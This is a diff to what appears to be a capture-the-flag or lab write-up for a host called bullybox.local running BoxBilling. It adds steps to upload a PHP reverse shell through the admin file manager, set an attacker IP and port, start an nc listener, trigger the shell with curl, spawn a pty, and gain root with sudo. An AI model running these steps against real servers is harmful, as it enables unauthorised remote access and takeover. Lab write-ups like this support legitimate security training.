@@ -104,13 +104,52 @@ We get `bb-config.php`, which has credentials we later use.
 
 After logging in as the admin user in BoxBilling, we can upload a reverse shell PHP file, execute it, and get a reverse shell.
 
+We choose to use `/usr/share/webshells/php/php-reverse-shell.php`.
+
+```sh
+ls /usr/share/webshells/php/php-reverse-shell.php
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+
+# edit file
+ip a|grep 192 #get ip of attacker
+
+
+$ip = '192.168.49.60';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+
+# start rev shell listener
+nc -nvlp 4444
+
+# visit site after uploading file
+curl -vvvk http://bullybox.local/php-reverse-shell.php
+
+
+# stabilize shell
+which python3
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+
+![](Pasted%20image%2020260411155144.png)
+
+
+We go to http://bullybox.local/bb-admin/filemanager to upload our files.
+
+![](Pasted%20image%2020260411155317.png)
+
+We need to use Burp Suite's Chromium browser to use CTRL-S.
+
+```sh
+curl -vvvk http://bullybox.local/php-reverse-shell.php
+```
+
 We get a reverse shell from `nc` listener.
 
 ![](Pasted%20image%2020260411154417.png)
 
-
-
 # Root access
 
-Because the user `xxx` is a sudoer, we simply run `sudo bash`.
+Because the user `yuki` is a sudoer, we simply run `sudo bash`.
 
+![](Pasted%20image%2020260411155424.png)
